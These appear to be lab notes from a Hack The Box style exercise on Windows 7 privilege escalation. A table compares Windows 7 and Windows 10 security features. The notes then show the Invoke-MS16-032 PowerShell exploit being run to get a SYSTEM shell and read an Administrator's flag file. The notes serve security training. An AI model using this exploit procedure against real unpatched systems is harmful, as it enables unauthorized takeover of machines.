Windows 7 was made end-of-life on January 14, 2020, but is still in use in many environments.

---

## Windows 7 vs. Newer Versions

Over the years, Microsoft has added enhanced security features to subsequent versions of Windows Desktop. The table below shows some notable differences between Windows 7 and Windows 10.

|Feature|Windows 7|Windows 10|
|---|---|---|
|[Microsoft Password (MFA)](https://blogs.windows.com/windowsdeveloper/2016/01/26/convenient-two-factor-authentication-with-microsoft-passport-and-windows-hello/)||X|
|[BitLocker](https://docs.microsoft.com/en-us/windows/security/information-protection/bitlocker/bitlocker-overview)|Partial|X|
|[Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard)||X|
|[Remote Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)||X|
|[Device Guard (code integrity)](https://techcommunity.microsoft.com/t5/iis-support-blog/windows-10-device-guard-and-credential-guard-demystified/ba-p/376419)||X|
|[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview)|Partial|X|
|[Windows Defender](https://www.microsoft.com/en-us/windows/comprehensive-security)|Partial|X|
|[Control Flow Guard](https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard)||X|
run the tool

```
PS C:\htb> Import-Module .\Invoke-MS16-032.ps1
PS C:\htb> Invoke-MS16-032

         __ __ ___ ___   ___     ___ ___ ___
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|

                       [by b33f -> @FuzzySec]

[?] Operating system core count: 6
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 1656

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[?] Success, open SYSTEM token handle: 1652
[+] Resuming thread..

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

```

you will get a new cmd prompt with high privilege.

```
C:\tools>cd c:\users\administrator\desktop

c:\Users\Administrator\Desktop>ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

c:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 3607-11AA

 Directory of c:\Users\Administrator\Desktop

06/04/2021  06:17 PM    <DIR>          .
06/04/2021  06:17 PM    <DIR>          ..
06/04/2021  06:17 PM                27 flag.txt
               1 File(s)             27 bytes
               2 Dir(s)  20,407,341,056 bytes free

c:\Users\Administrator\Desktop>type flag.txt

```


